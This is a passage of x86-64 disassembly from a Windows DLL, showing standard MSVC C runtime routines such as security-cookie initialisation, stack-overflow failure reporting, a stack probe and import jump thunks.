   180004f78:	48 89 0d 89 60 00 00 	mov    %rcx,0x6089(%rip)        # 0x18000b008
   180004f7f:	3c 01                	cmp    $0x1,%al
   180004f81:	76 0b                	jbe    0x180004f8e
   180004f83:	48 83 e1 bf          	and    $0xffffffffffffffbf,%rcx
   180004f87:	48 89 0d 7a 60 00 00 	mov    %rcx,0x607a(%rip)        # 0x18000b008
   180004f8e:	41 0f ba e2 15       	bt     $0x15,%r10d
   180004f93:	73 15                	jae    0x180004faa
   180004f95:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   180004f9a:	48 0f ba e0 13       	bt     $0x13,%rax
   180004f9f:	73 09                	jae    0x180004faa
   180004fa1:	48 0f ba 35 5e 60 00 	btrq   $0x7,0x605e(%rip)        # 0x18000b008
   180004fa8:	00 07 
   180004faa:	48 8b 5c 24 28       	mov    0x28(%rsp),%rbx
   180004faf:	33 c0                	xor    %eax,%eax
   180004fb1:	48 8b 6c 24 30       	mov    0x30(%rsp),%rbp
   180004fb6:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   180004fbb:	48 83 c4 10          	add    $0x10,%rsp
   180004fbf:	5f                   	pop    %rdi
   180004fc0:	c3                   	ret
   180004fc1:	cc                   	int3
   180004fc2:	cc                   	int3
   180004fc3:	cc                   	int3
   180004fc4:	40 53                	rex push %rbx
   180004fc6:	48 83 ec 20          	sub    $0x20,%rsp
   180004fca:	48 8b d9             	mov    %rcx,%rbx
   180004fcd:	33 c9                	xor    %ecx,%ecx
   180004fcf:	ff 15 2b 11 00 00    	call   *0x112b(%rip)        # 0x180006100
   180004fd5:	48 8b cb             	mov    %rbx,%rcx
   180004fd8:	ff 15 da 10 00 00    	call   *0x10da(%rip)        # 0x1800060b8
   180004fde:	ff 15 24 11 00 00    	call   *0x1124(%rip)        # 0x180006108
   180004fe4:	48 8b c8             	mov    %rax,%rcx
   180004fe7:	ba 09 04 00 c0       	mov    $0xc0000409,%edx
   180004fec:	48 83 c4 20          	add    $0x20,%rsp
   180004ff0:	5b                   	pop    %rbx
   180004ff1:	48 ff 25 00 11 00 00 	rex.W jmp *0x1100(%rip)        # 0x1800060f8
   180004ff8:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   180004ffd:	48 83 ec 38          	sub    $0x38,%rsp
   180005001:	b9 17 00 00 00       	mov    $0x17,%ecx
   180005006:	ff 15 e4 10 00 00    	call   *0x10e4(%rip)        # 0x1800060f0
   18000500c:	85 c0                	test   %eax,%eax
   18000500e:	74 07                	je     0x180005017
   180005010:	b9 02 00 00 00       	mov    $0x2,%ecx
   180005015:	cd 29                	int    $0x29
   180005017:	48 8d 0d 22 62 00 00 	lea    0x6222(%rip),%rcx        # 0x18000b240
   18000501e:	e8 a9 00 00 00       	call   0x1800050cc
   180005023:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
   180005028:	48 89 05 09 63 00 00 	mov    %rax,0x6309(%rip)        # 0x18000b338
   18000502f:	48 8d 44 24 38       	lea    0x38(%rsp),%rax
   180005034:	48 83 c0 08          	add    $0x8,%rax
   180005038:	48 89 05 99 62 00 00 	mov    %rax,0x6299(%rip)        # 0x18000b2d8
   18000503f:	48 8b 05 f2 62 00 00 	mov    0x62f2(%rip),%rax        # 0x18000b338
   180005046:	48 89 05 63 61 00 00 	mov    %rax,0x6163(%rip)        # 0x18000b1b0
   18000504d:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   180005052:	48 89 05 67 62 00 00 	mov    %rax,0x6267(%rip)        # 0x18000b2c0
   180005059:	c7 05 3d 61 00 00 09 	movl   $0xc0000409,0x613d(%rip)        # 0x18000b1a0
   180005060:	04 00 c0 
   180005063:	c7 05 37 61 00 00 01 	movl   $0x1,0x6137(%rip)        # 0x18000b1a4
   18000506a:	00 00 00 
   18000506d:	c7 05 41 61 00 00 01 	movl   $0x1,0x6141(%rip)        # 0x18000b1b8
   180005074:	00 00 00 
   180005077:	b8 08 00 00 00       	mov    $0x8,%eax
   18000507c:	48 6b c0 00          	imul   $0x0,%rax,%rax
   180005080:	48 8d 0d 39 61 00 00 	lea    0x6139(%rip),%rcx        # 0x18000b1c0
   180005087:	48 c7 04 01 02 00 00 	movq   $0x2,(%rcx,%rax,1)
   18000508e:	00 
   18000508f:	b8 08 00 00 00       	mov    $0x8,%eax
   180005094:	48 6b c0 00          	imul   $0x0,%rax,%rax
   180005098:	48 8b 0d a1 5f 00 00 	mov    0x5fa1(%rip),%rcx        # 0x18000b040
   18000509f:	48 89 4c 04 20       	mov    %rcx,0x20(%rsp,%rax,1)
   1800050a4:	b8 08 00 00 00       	mov    $0x8,%eax
   1800050a9:	48 6b c0 01          	imul   $0x1,%rax,%rax
   1800050ad:	48 8b 0d cc 5f 00 00 	mov    0x5fcc(%rip),%rcx        # 0x18000b080
   1800050b4:	48 89 4c 04 20       	mov    %rcx,0x20(%rsp,%rax,1)
   1800050b9:	48 8d 0d d8 37 00 00 	lea    0x37d8(%rip),%rcx        # 0x180008898
   1800050c0:	e8 ff fe ff ff       	call   0x180004fc4
   1800050c5:	90                   	nop
   1800050c6:	48 83 c4 38          	add    $0x38,%rsp
   1800050ca:	c3                   	ret
   1800050cb:	cc                   	int3
   1800050cc:	40 53                	rex push %rbx
   1800050ce:	56                   	push   %rsi
   1800050cf:	57                   	push   %rdi
   1800050d0:	48 83 ec 40          	sub    $0x40,%rsp
   1800050d4:	48 8b d9             	mov    %rcx,%rbx
   1800050d7:	ff 15 33 10 00 00    	call   *0x1033(%rip)        # 0x180006110
   1800050dd:	48 8b b3 f8 00 00 00 	mov    0xf8(%rbx),%rsi
   1800050e4:	33 ff                	xor    %edi,%edi
   1800050e6:	45 33 c0             	xor    %r8d,%r8d
   1800050e9:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   1800050ee:	48 8b ce             	mov    %rsi,%rcx
   1800050f1:	ff 15 b1 0f 00 00    	call   *0xfb1(%rip)        # 0x1800060a8
   1800050f7:	48 85 c0             	test   %rax,%rax
   1800050fa:	74 3c                	je     0x180005138
   1800050fc:	48 8b 54 24 60       	mov    0x60(%rsp),%rdx
   180005101:	48 8d 4c 24 68       	lea    0x68(%rsp),%rcx
   180005106:	48 c7 44 24 38 00 00 	movq   $0x0,0x38(%rsp)
   18000510d:	00 00 
   18000510f:	4c 8b c8             	mov    %rax,%r9
   180005112:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   180005117:	4c 8b c6             	mov    %rsi,%r8
   18000511a:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   18000511f:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   180005124:	33 c9                	xor    %ecx,%ecx
   180005126:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   18000512b:	ff 15 7f 0f 00 00    	call   *0xf7f(%rip)        # 0x1800060b0
   180005131:	ff c7                	inc    %edi
   180005133:	83 ff 02             	cmp    $0x2,%edi
   180005136:	7c ae                	jl     0x1800050e6
   180005138:	48 83 c4 40          	add    $0x40,%rsp
   18000513c:	5f                   	pop    %rdi
   18000513d:	5e                   	pop    %rsi
   18000513e:	5b                   	pop    %rbx
   18000513f:	c3                   	ret
   180005140:	48 8d 05 91 37 00 00 	lea    0x3791(%rip),%rax        # 0x1800088d8
   180005147:	48 c7 41 10 00 00 00 	movq   $0x0,0x10(%rcx)
   18000514e:	00 
   18000514f:	48 89 41 08          	mov    %rax,0x8(%rcx)
   180005153:	48 8d 05 6e 37 00 00 	lea    0x376e(%rip),%rax        # 0x1800088c8
   18000515a:	48 89 01             	mov    %rax,(%rcx)
   18000515d:	48 8b c1             	mov    %rcx,%rax
   180005160:	c3                   	ret
   180005161:	cc                   	int3
   180005162:	cc                   	int3
   180005163:	cc                   	int3
   180005164:	48 83 ec 48          	sub    $0x48,%rsp
   180005168:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   18000516d:	e8 ce ff ff ff       	call   0x180005140
   180005172:	48 8d 15 47 4c 00 00 	lea    0x4c47(%rip),%rdx        # 0x180009dc0
   180005179:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   18000517e:	e8 17 03 00 00       	call   0x18000549a
   180005183:	cc                   	int3
   180005184:	c2 00 00             	ret    $0x0
   180005187:	cc                   	int3
   180005188:	b8 01 00 00 00       	mov    $0x1,%eax
   18000518d:	c3                   	ret
   18000518e:	cc                   	int3
   18000518f:	cc                   	int3
   180005190:	33 c0                	xor    %eax,%eax
   180005192:	39 05 f8 5e 00 00    	cmp    %eax,0x5ef8(%rip)        # 0x18000b090
   180005198:	0f 95 c0             	setne  %al
   18000519b:	c3                   	ret
   18000519c:	c7 05 6a 65 00 00 00 	movl   $0x0,0x656a(%rip)        # 0x18000b710
   1800051a3:	00 00 00 
   1800051a6:	c3                   	ret
   1800051a7:	cc                   	int3
   1800051a8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1800051ad:	55                   	push   %rbp
   1800051ae:	48 8d ac 24 40 fb ff 	lea    -0x4c0(%rsp),%rbp
   1800051b5:	ff 
   1800051b6:	48 81 ec c0 05 00 00 	sub    $0x5c0,%rsp
   1800051bd:	8b d9                	mov    %ecx,%ebx
   1800051bf:	b9 17 00 00 00       	mov    $0x17,%ecx
   1800051c4:	ff 15 26 0f 00 00    	call   *0xf26(%rip)        # 0x1800060f0
   1800051ca:	85 c0                	test   %eax,%eax
   1800051cc:	74 04                	je     0x1800051d2
   1800051ce:	8b cb                	mov    %ebx,%ecx
   1800051d0:	cd 29                	int    $0x29
   1800051d2:	b9 03 00 00 00       	mov    $0x3,%ecx
   1800051d7:	e8 c0 ff ff ff       	call   0x18000519c
   1800051dc:	33 d2                	xor    %edx,%edx
   1800051de:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   1800051e2:	41 b8 d0 04 00 00    	mov    $0x4d0,%r8d
   1800051e8:	e8 95 02 00 00       	call   0x180005482
   1800051ed:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   1800051f1:	ff 15 19 0f 00 00    	call   *0xf19(%rip)        # 0x180006110
   1800051f7:	48 8b 9d e8 00 00 00 	mov    0xe8(%rbp),%rbx
   1800051fe:	48 8d 95 d8 04 00 00 	lea    0x4d8(%rbp),%rdx
   180005205:	48 8b cb             	mov    %rbx,%rcx
   180005208:	45 33 c0             	xor    %r8d,%r8d
   18000520b:	ff 15 97 0e 00 00    	call   *0xe97(%rip)        # 0x1800060a8
   180005211:	48 85 c0             	test   %rax,%rax
   180005214:	74 3f                	je     0x180005255
   180005216:	48 8b 95 d8 04 00 00 	mov    0x4d8(%rbp),%rdx
   18000521d:	48 8d 8d e0 04 00 00 	lea    0x4e0(%rbp),%rcx
   180005224:	48 c7 44 24 38 00 00 	movq   $0x0,0x38(%rsp)
   18000522b:	00 00 
   18000522d:	4c 8b c8             	mov    %rax,%r9
   180005230:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   180005235:	4c 8b c3             	mov    %rbx,%r8
   180005238:	48 8d 8d e8 04 00 00 	lea    0x4e8(%rbp),%rcx
   18000523f:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   180005244:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   180005248:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   18000524d:	33 c9                	xor    %ecx,%ecx
   18000524f:	ff 15 5b 0e 00 00    	call   *0xe5b(%rip)        # 0x1800060b0
   180005255:	48 8b 85 c8 04 00 00 	mov    0x4c8(%rbp),%rax
   18000525c:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   180005261:	48 89 85 e8 00 00 00 	mov    %rax,0xe8(%rbp)
   180005268:	33 d2                	xor    %edx,%edx
   18000526a:	48 8d 85 c8 04 00 00 	lea    0x4c8(%rbp),%rax
   180005271:	41 b8 98 00 00 00    	mov    $0x98,%r8d
   180005277:	48 83 c0 08          	add    $0x8,%rax
   18000527b:	48 89 85 88 00 00 00 	mov    %rax,0x88(%rbp)
   180005282:	e8 fb 01 00 00       	call   0x180005482
   180005287:	48 8b 85 c8 04 00 00 	mov    0x4c8(%rbp),%rax
   18000528e:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   180005293:	c7 44 24 50 15 00 00 	movl   $0x40000015,0x50(%rsp)
   18000529a:	40 
   18000529b:	c7 44 24 54 01 00 00 	movl   $0x1,0x54(%rsp)
   1800052a2:	00 
   1800052a3:	ff 15 3f 0e 00 00    	call   *0xe3f(%rip)        # 0x1800060e8
   1800052a9:	8b d8                	mov    %eax,%ebx
   1800052ab:	33 c9                	xor    %ecx,%ecx
   1800052ad:	48 8d 44 24 50       	lea    0x50(%rsp),%rax
   1800052b2:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   1800052b7:	48 8d 45 f0          	lea    -0x10(%rbp),%rax
   1800052bb:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   1800052c0:	ff 15 3a 0e 00 00    	call   *0xe3a(%rip)        # 0x180006100
   1800052c6:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   1800052cb:	ff 15 e7 0d 00 00    	call   *0xde7(%rip)        # 0x1800060b8
   1800052d1:	85 c0                	test   %eax,%eax
   1800052d3:	75 0d                	jne    0x1800052e2
   1800052d5:	83 fb 01             	cmp    $0x1,%ebx
   1800052d8:	74 08                	je     0x1800052e2
   1800052da:	8d 48 03             	lea    0x3(%rax),%ecx
   1800052dd:	e8 ba fe ff ff       	call   0x18000519c
   1800052e2:	48 8b 9c 24 d0 05 00 	mov    0x5d0(%rsp),%rbx
   1800052e9:	00 
   1800052ea:	48 81 c4 c0 05 00 00 	add    $0x5c0,%rsp
   1800052f1:	5d                   	pop    %rbp
   1800052f2:	c3                   	ret
   1800052f3:	cc                   	int3
   1800052f4:	e9 fb 01 00 00       	jmp    0x1800054f4
   1800052f9:	cc                   	int3
   1800052fa:	cc                   	int3
   1800052fb:	cc                   	int3
   1800052fc:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   180005301:	55                   	push   %rbp
   180005302:	48 8b ec             	mov    %rsp,%rbp
   180005305:	48 83 ec 30          	sub    $0x30,%rsp
   180005309:	48 8b 05 30 5d 00 00 	mov    0x5d30(%rip),%rax        # 0x18000b040
   180005310:	48 bb 32 a2 df 2d 99 	movabs $0x2b992ddfa232,%rbx
   180005317:	2b 00 00 
   18000531a:	48 3b c3             	cmp    %rbx,%rax
   18000531d:	75 77                	jne    0x180005396
   18000531f:	48 8d 4d 10          	lea    0x10(%rbp),%rcx
   180005323:	48 c7 45 10 00 00 00 	movq   $0x0,0x10(%rbp)
   18000532a:	00 
   18000532b:	ff 15 97 0d 00 00    	call   *0xd97(%rip)        # 0x1800060c8
   180005331:	48 8b 45 10          	mov    0x10(%rbp),%rax
   180005335:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   180005339:	ff 15 91 0d 00 00    	call   *0xd91(%rip)        # 0x1800060d0
   18000533f:	8b c0                	mov    %eax,%eax
   180005341:	48 31 45 f0          	xor    %rax,-0x10(%rbp)
   180005345:	ff 15 8d 0d 00 00    	call   *0xd8d(%rip)        # 0x1800060d8
   18000534b:	8b c0                	mov    %eax,%eax
   18000534d:	48 8d 4d 18          	lea    0x18(%rbp),%rcx
   180005351:	48 31 45 f0          	xor    %rax,-0x10(%rbp)
   180005355:	ff 15 85 0d 00 00    	call   *0xd85(%rip)        # 0x1800060e0
   18000535b:	8b 45 18             	mov    0x18(%rbp),%eax
   18000535e:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   180005362:	48 c1 e0 20          	shl    $0x20,%rax
   180005366:	48 33 45 18          	xor    0x18(%rbp),%rax
   18000536a:	48 33 45 f0          	xor    -0x10(%rbp),%rax
   18000536e:	48 33 c1             	xor    %rcx,%rax
   180005371:	48 b9 ff ff ff ff ff 	movabs $0xffffffffffff,%rcx
   180005378:	ff 00 00 
   18000537b:	48 23 c1             	and    %rcx,%rax
   18000537e:	48 b9 33 a2 df 2d 99 	movabs $0x2b992ddfa233,%rcx
   180005385:	2b 00 00 
   180005388:	48 3b c3             	cmp    %rbx,%rax
   18000538b:	48 0f 44 c1          	cmove  %rcx,%rax
   18000538f:	48 89 05 aa 5c 00 00 	mov    %rax,0x5caa(%rip)        # 0x18000b040
   180005396:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   18000539b:	48 f7 d0             	not    %rax
   18000539e:	48 89 05 db 5c 00 00 	mov    %rax,0x5cdb(%rip)        # 0x18000b080
   1800053a5:	48 83 c4 30          	add    $0x30,%rsp
   1800053a9:	5d                   	pop    %rbp
   1800053aa:	c3                   	ret
   1800053ab:	cc                   	int3
   1800053ac:	48 8d 0d 6d 63 00 00 	lea    0x636d(%rip),%rcx        # 0x18000b720
   1800053b3:	48 ff 25 06 0d 00 00 	rex.W jmp *0xd06(%rip)        # 0x1800060c0
   1800053ba:	cc                   	int3
   1800053bb:	cc                   	int3
   1800053bc:	48 8d 0d 5d 63 00 00 	lea    0x635d(%rip),%rcx        # 0x18000b720
   1800053c3:	e9 d8 00 00 00       	jmp    0x1800054a0
   1800053c8:	48 8d 05 61 63 00 00 	lea    0x6361(%rip),%rax        # 0x18000b730
   1800053cf:	c3                   	ret
   1800053d0:	48 83 ec 28          	sub    $0x28,%rsp
   1800053d4:	e8 d7 bd ff ff       	call   0x1800011b0
   1800053d9:	48 83 08 24          	orq    $0x24,(%rax)
   1800053dd:	e8 e6 ff ff ff       	call   0x1800053c8
   1800053e2:	48 83 08 02          	orq    $0x2,(%rax)
   1800053e6:	48 83 c4 28          	add    $0x28,%rsp
   1800053ea:	c3                   	ret
   1800053eb:	cc                   	int3
   1800053ec:	48 8d 05 95 63 00 00 	lea    0x6395(%rip),%rax        # 0x18000b788
   1800053f3:	c3                   	ret
   1800053f4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1800053f9:	57                   	push   %rdi
   1800053fa:	48 83 ec 20          	sub    $0x20,%rsp
   1800053fe:	48 8d 1d 43 42 00 00 	lea    0x4243(%rip),%rbx        # 0x180009648
   180005405:	48 8d 3d 3c 42 00 00 	lea    0x423c(%rip),%rdi        # 0x180009648
   18000540c:	eb 12                	jmp    0x180005420
   18000540e:	48 8b 03             	mov    (%rbx),%rax
   180005411:	48 85 c0             	test   %rax,%rax
   180005414:	74 06                	je     0x18000541c
   180005416:	ff 15 9c 0e 00 00    	call   *0xe9c(%rip)        # 0x1800062b8
   18000541c:	48 83 c3 08          	add    $0x8,%rbx
   180005420:	48 3b df             	cmp    %rdi,%rbx
   180005423:	72 e9                	jb     0x18000540e
   180005425:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   18000542a:	48 83 c4 20          	add    $0x20,%rsp
   18000542e:	5f                   	pop    %rdi
   18000542f:	c3                   	ret
   180005430:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180005435:	57                   	push   %rdi
   180005436:	48 83 ec 20          	sub    $0x20,%rsp
   18000543a:	48 8d 1d 17 42 00 00 	lea    0x4217(%rip),%rbx        # 0x180009658
   180005441:	48 8d 3d 10 42 00 00 	lea    0x4210(%rip),%rdi        # 0x180009658
   180005448:	eb 12                	jmp    0x18000545c
   18000544a:	48 8b 03             	mov    (%rbx),%rax
   18000544d:	48 85 c0             	test   %rax,%rax
   180005450:	74 06                	je     0x180005458
   180005452:	ff 15 60 0e 00 00    	call   *0xe60(%rip)        # 0x1800062b8
   180005458:	48 83 c3 08          	add    $0x8,%rbx
   18000545c:	48 3b df             	cmp    %rdi,%rbx
   18000545f:	72 e9                	jb     0x18000544a
   180005461:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180005466:	48 83 c4 20          	add    $0x20,%rsp
   18000546a:	5f                   	pop    %rdi
   18000546b:	c3                   	ret
   18000546c:	cc                   	int3
   18000546d:	cc                   	int3
   18000546e:	cc                   	int3
   18000546f:	cc                   	int3
   180005470:	ff 25 1a 0d 00 00    	jmp    *0xd1a(%rip)        # 0x180006190
   180005476:	ff 25 f4 0c 00 00    	jmp    *0xcf4(%rip)        # 0x180006170
   18000547c:	ff 25 c6 0c 00 00    	jmp    *0xcc6(%rip)        # 0x180006148
   180005482:	ff 25 a8 0c 00 00    	jmp    *0xca8(%rip)        # 0x180006130
   180005488:	ff 25 aa 0c 00 00    	jmp    *0xcaa(%rip)        # 0x180006138
   18000548e:	ff 25 ac 0c 00 00    	jmp    *0xcac(%rip)        # 0x180006140
   180005494:	ff 25 de 0c 00 00    	jmp    *0xcde(%rip)        # 0x180006178
   18000549a:	ff 25 b0 0c 00 00    	jmp    *0xcb0(%rip)        # 0x180006150
   1800054a0:	ff 25 b2 0c 00 00    	jmp    *0xcb2(%rip)        # 0x180006158
   1800054a6:	ff 25 44 0d 00 00    	jmp    *0xd44(%rip)        # 0x1800061f0
   1800054ac:	ff 25 36 0d 00 00    	jmp    *0xd36(%rip)        # 0x1800061e8
   1800054b2:	ff 25 a8 0d 00 00    	jmp    *0xda8(%rip)        # 0x180006260
   1800054b8:	ff 25 9a 0d 00 00    	jmp    *0xd9a(%rip)        # 0x180006258
   1800054be:	ff 25 8c 0d 00 00    	jmp    *0xd8c(%rip)        # 0x180006250
   1800054c4:	ff 25 7e 0d 00 00    	jmp    *0xd7e(%rip)        # 0x180006248
   1800054ca:	ff 25 68 0d 00 00    	jmp    *0xd68(%rip)        # 0x180006238
   1800054d0:	ff 25 4a 0d 00 00    	jmp    *0xd4a(%rip)        # 0x180006220
   1800054d6:	ff 25 2c 0d 00 00    	jmp    *0xd2c(%rip)        # 0x180006208
   1800054dc:	ff 25 46 0d 00 00    	jmp    *0xd46(%rip)        # 0x180006228
   1800054e2:	ff 25 28 0d 00 00    	jmp    *0xd28(%rip)        # 0x180006210
   1800054e8:	ff 25 2a 0d 00 00    	jmp    *0xd2a(%rip)        # 0x180006218
   1800054ee:	ff 25 3c 0d 00 00    	jmp    *0xd3c(%rip)        # 0x180006230
   1800054f4:	ff 25 fe 0c 00 00    	jmp    *0xcfe(%rip)        # 0x1800061f8
   1800054fa:	cc                   	int3
   1800054fb:	cc                   	int3
   1800054fc:	b0 01                	mov    $0x1,%al
   1800054fe:	c3                   	ret
   1800054ff:	cc                   	int3
   180005500:	33 c0                	xor    %eax,%eax
   180005502:	c3                   	ret
   180005503:	cc                   	int3
   180005504:	48 8b c4             	mov    %rsp,%rax
   180005507:	48 89 58 08          	mov    %rbx,0x8(%rax)
   18000550b:	48 89 68 10          	mov    %rbp,0x10(%rax)
   18000550f:	48 89 70 18          	mov    %rsi,0x18(%rax)
   180005513:	48 89 78 20          	mov    %rdi,0x20(%rax)
   180005517:	41 56                	push   %r14
   180005519:	48 83 ec 20          	sub    $0x20,%rsp
   18000551d:	49 8b 59 38          	mov    0x38(%r9),%rbx
   180005521:	48 8b f2             	mov    %rdx,%rsi
   180005524:	4d 8b f0             	mov    %r8,%r14
   180005527:	48 8b e9             	mov    %rcx,%rbp
   18000552a:	49 8b d1             	mov    %r9,%rdx
   18000552d:	48 8b ce             	mov    %rsi,%rcx
   180005530:	49 8b f9             	mov    %r9,%rdi
   180005533:	4c 8d 43 04          	lea    0x4(%rbx),%r8
   180005537:	e8 90 f7 ff ff       	call   0x180004ccc
   18000553c:	8b 45 04             	mov    0x4(%rbp),%eax
   18000553f:	24 66                	and    $0x66,%al
   180005541:	f6 d8                	neg    %al
   180005543:	b8 01 00 00 00       	mov    $0x1,%eax
   180005548:	45 1b c9             	sbb    %r9d,%r9d
   18000554b:	41 f7 d9             	neg    %r9d
   18000554e:	44 03 c8             	add    %eax,%r9d
   180005551:	44 85 4b 04          	test   %r9d,0x4(%rbx)
   180005555:	74 11                	je     0x180005568
   180005557:	4c 8b cf             	mov    %rdi,%r9
   18000555a:	4d 8b c6             	mov    %r14,%r8
   18000555d:	48 8b d6             	mov    %rsi,%rdx
   180005560:	48 8b cd             	mov    %rbp,%rcx
   180005563:	e8 08 ff ff ff       	call   0x180005470
   180005568:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   18000556d:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   180005572:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   180005577:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   18000557c:	48 83 c4 20          	add    $0x20,%rsp
   180005580:	41 5e                	pop    %r14
   180005582:	c3                   	ret
   180005583:	cc                   	int3
   180005584:	cc                   	int3
   180005585:	cc                   	int3
   180005586:	cc                   	int3
   180005587:	cc                   	int3
   180005588:	cc                   	int3
   180005589:	cc                   	int3
   18000558a:	cc                   	int3
   18000558b:	cc                   	int3
   18000558c:	cc                   	int3
   18000558d:	cc                   	int3
   18000558e:	cc                   	int3
   18000558f:	cc                   	int3
   180005590:	cc                   	int3
   180005591:	cc                   	int3
   180005592:	cc                   	int3
   180005593:	cc                   	int3
   180005594:	cc                   	int3
   180005595:	cc                   	int3
   180005596:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   18000559d:	00 00 00 
   1800055a0:	48 83 ec 10          	sub    $0x10,%rsp
   1800055a4:	4c 89 14 24          	mov    %r10,(%rsp)
   1800055a8:	4c 89 5c 24 08       	mov    %r11,0x8(%rsp)
   1800055ad:	4d 33 db             	xor    %r11,%r11
   1800055b0:	4c 8d 54 24 18       	lea    0x18(%rsp),%r10
   1800055b5:	4c 2b d0             	sub    %rax,%r10
   1800055b8:	4d 0f 42 d3          	cmovb  %r11,%r10
   1800055bc:	65 4c 8b 1c 25 10 00 	mov    %gs:0x10,%r11
   1800055c3:	00 00 
   1800055c5:	4d 3b d3             	cmp    %r11,%r10
   1800055c8:	73 16                	jae    0x1800055e0
   1800055ca:	66 41 81 e2 00 f0    	and    $0xf000,%r10w
   1800055d0:	4d 8d 9b 00 f0 ff ff 	lea    -0x1000(%r11),%r11
   1800055d7:	41 c6 03 00          	movb   $0x0,(%r11)
   1800055db:	4d 3b d3             	cmp    %r11,%r10
   1800055de:	75 f0                	jne    0x1800055d0
   1800055e0:	4c 8b 14 24          	mov    (%rsp),%r10
   1800055e4:	4c 8b 5c 24 08       	mov    0x8(%rsp),%r11
   1800055e9:	48 83 c4 10          	add    $0x10,%rsp
   1800055ed:	c3                   	ret
   1800055ee:	ff 25 8c 0b 00 00    	jmp    *0xb8c(%rip)        # 0x180006180
   1800055f4:	cc                   	int3
   1800055f5:	cc                   	int3
   1800055f6:	cc                   	int3
   1800055f7:	cc                   	int3
   1800055f8:	cc                   	int3
   1800055f9:	cc                   	int3
   1800055fa:	cc                   	int3
   1800055fb:	cc                   	int3
   1800055fc:	cc                   	int3
   1800055fd:	cc                   	int3
   1800055fe:	cc                   	int3
   1800055ff:	cc                   	int3
   180005600:	cc                   	int3
   180005601:	cc                   	int3
   180005602:	cc                   	int3
   180005603:	cc                   	int3
   180005604:	cc                   	int3
   180005605:	cc                   	int3
   180005606:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   18000560d:	00 00 00 
   180005610:	ff e0                	jmp    *%rax
   180005612:	cc                   	int3
   180005613:	cc                   	int3
   180005614:	cc                   	int3
   180005615:	cc                   	int3
   180005616:	cc                   	int3
   180005617:	cc                   	int3
   180005618:	cc                   	int3
   180005619:	cc                   	int3
   18000561a:	cc                   	int3
   18000561b:	cc                   	int3
   18000561c:	cc                   	int3
   18000561d:	cc                   	int3
   18000561e:	cc                   	int3
   18000561f:	cc                   	int3
   180005620:	cc                   	int3
   180005621:	cc                   	int3
   180005622:	cc                   	int3
   180005623:	cc                   	int3
   180005624:	cc                   	int3
   180005625:	cc                   	int3
   180005626:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   18000562d:	00 00 00 
   180005630:	ff 25 82 0c 00 00    	jmp    *0xc82(%rip)        # 0x1800062b8
   180005636:	cc                   	int3
   180005637:	cc                   	int3
   180005638:	cc                   	int3
   180005639:	cc                   	int3
   18000563a:	cc                   	int3
   18000563b:	cc                   	int3
   18000563c:	cc                   	int3
   18000563d:	cc                   	int3
   18000563e:	cc                   	int3
   18000563f:	cc                   	int3
   180005640:	40 55                	rex push %rbp
   180005642:	48 83 ec 20          	sub    $0x20,%rsp
   180005646:	48 8b ea             	mov    %rdx,%rbp
   180005649:	8b 45 30             	mov    0x30(%rbp),%eax
   18000564c:	83 e0 01             	and    $0x1,%eax
   18000564f:	85 c0                	test   %eax,%eax
   180005651:	74 0d                	je     0x180005660
   180005653:	83 65 30 fe          	andl   $0xfffffffe,0x30(%rbp)
   180005657:	48 8b 4d 38          	mov    0x38(%rbp),%rcx
   18000565b:	e8 e0 cb ff ff       	call   0x180002240
   180005660:	48 83 c4 20          	add    $0x20,%rsp
   180005664:	5d                   	pop    %rbp
   180005665:	c3                   	ret
   180005666:	cc                   	int3
   180005667:	cc                   	int3
   180005668:	cc                   	int3
   180005669:	cc                   	int3
   18000566a:	cc                   	int3
   18000566b:	cc                   	int3
   18000566c:	cc                   	int3
   18000566d:	cc                   	int3
   18000566e:	cc                   	int3
   18000566f:	cc                   	int3
   180005670:	40 55                	rex push %rbp
   180005672:	48 83 ec 20          	sub    $0x20,%rsp
   180005676:	48 8b ea             	mov    %rdx,%rbp
   180005679:	4c 8d 0d b0 cc ff ff 	lea    -0x3350(%rip),%r9        # 0x180002330
   180005680:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   180005686:	ba 20 00 00 00       	mov    $0x20,%edx
   18000568b:	48 8d 4d 20          	lea    0x20(%rbp),%rcx
   18000568f:	e8 58 ee ff ff       	call   0x1800044ec
   180005694:	48 83 c4 20          	add    $0x20,%rsp
   180005698:	5d                   	pop    %rbp
   180005699:	c3                   	ret
   18000569a:	48 8d 8a 50 00 00 00 	lea    0x50(%rdx),%rcx
